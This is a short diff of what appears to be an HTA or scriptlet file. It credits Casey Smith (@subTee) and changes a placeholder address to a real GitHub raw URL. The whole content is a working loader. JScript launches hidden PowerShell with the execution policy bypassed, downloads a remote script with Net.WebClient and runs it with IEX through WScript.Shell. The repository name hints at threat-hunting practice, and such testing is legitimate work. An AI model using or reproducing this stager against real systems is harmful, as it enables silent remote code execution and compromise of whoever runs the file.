@@ -6,8 +6,8 @@
 	<!-- Learn from Casey Smith @subTee -->
 	<script language="JScript">
 		<![CDATA[
-			rat="powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/')";
-		new ActiveXObject("WScript.Shell").Run(rat,0,true);
+			rat="powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xMo/TestThreatHunting/main/createHTA.text')";
+			new ActiveXObject("WScript.Shell").Run(rat,0,true);
 	
 		]]>
 </script>
